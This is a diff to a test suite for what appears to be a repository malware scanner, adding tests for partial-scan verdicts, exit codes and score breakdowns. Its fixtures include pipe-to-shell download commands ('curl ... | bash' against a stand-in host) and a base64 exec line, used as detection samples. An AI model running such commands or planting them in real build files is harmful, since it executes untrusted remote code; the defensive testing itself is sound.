@@ -1,4 +1,6 @@
+import base64
 import json
+import random
 import subprocess
 import sys
 
@@ -66,16 +68,79 @@ def test_terminal_escapes_in_repo_content_are_removed(
     assert "\x1b" not in out and "\x07" not in out
 
 
-def test_partial_scan_is_reported(
+# --- partial scans: Incomplete replaces only Clean -----------------------------
+
+BIG = 3 * 1024 * 1024
+
+
+def test_partial_clean_scan_is_incomplete_exit_4(
+    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
+) -> None:
+    fake_github.tarball = TarBuilder().file("a.txt", "hello\n").zeros("z.bin", BIG).build()
+    assert run(fake_github, "--max-total-mb", "1") == 4
+    out = capsys.readouterr().out
+    assert "Verdict: INCOMPLETE" in out
+    assert "PARTIAL SCAN: limit max_total_bytes (1048576) exceeded after 1 files" in out
+
+
+def test_partial_suspicious_scan_keeps_verdict(
+    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
+) -> None:
+    fake_github.tarball = TarBuilder().file("a.sh", "curl x | sh\n").zeros("z.bin", BIG).build()
+    # The finding read before the limit still counts.
+    assert run(fake_github, "--max-total-mb", "1") == 1
+    out = capsys.readouterr().out
+    assert "Verdict: SUSPICIOUS" in out
+    assert "PARTIAL SCAN: limit max_total_bytes" in out
+
+
+def test_partial_dangerous_scan_keeps_verdict(
     fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
 ) -> None:
     fake_github.tarball = (
-        TarBuilder().file("a.sh", "curl x | sh\n").zeros("z.bin", 3 * 1024 * 1024).build()
+        TarBuilder()
+        .file("a.sh", "curl x | sh\n")
+        .file("b.py", 'exec(base64.b64decode("cHJpbnQoMSk="))\n')
+        .zeros("z.bin", BIG)
+        .build()
     )
-    code = run(fake_github, "--max-total-mb", "1")
+    assert run(fake_github, "--max-total-mb", "1") == 2
+    assert "PARTIAL SCAN" in capsys.readouterr().out
+
+
+def test_partial_scan_json_names_limit_and_file_count(
+    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
+) -> None:
+    fake_github.tarball = make_tarball({f"f{i}.txt": "x" for i in range(20)})
+    assert run(fake_github, "--json", "--max-files", "5") == 4
+    data = json.loads(capsys.readouterr().out)
+    assert data["verdict"] == "incomplete"
+    assert data["complete"] is False
+    assert data["partial"]["limit"] == "max_files"
+    assert data["partial"]["limit_value"] == 5
+    # Entries counted against max_files include the root directory.
+    assert data["partial"]["files_scanned"] == 4
+
+
+def test_complete_scan_has_no_partial_block(
+    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
+) -> None:
+    run(fake_github, "--json")
+    data = json.loads(capsys.readouterr().out)
+    assert data["complete"] is True and data["partial"] is None
+
+
+def test_score_breakdown_names_each_rule(
+    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
+) -> None:
+    blob = base64.b64encode(random.Random(0).randbytes(240)).decode()
+    fake_github.tarball = make_tarball(
+        {"ci.yml": "run: curl -o- https://e.example/i.sh | bash\n", "t/data": f"x={blob}\n"}
+    )
+    assert run(fake_github) == 1
     out = capsys.readouterr().out
-    assert "WARNING: partial scan" in out
-    assert code == 1  # the finding read before the limit still counts
+    assert "Score: 50/100" in out
+    assert "Score breakdown: GR-CODE-002 +35, GR-OBF-001 +15" in out
 
 
 # --- exit code 3 for every kind of error --------------------------------------
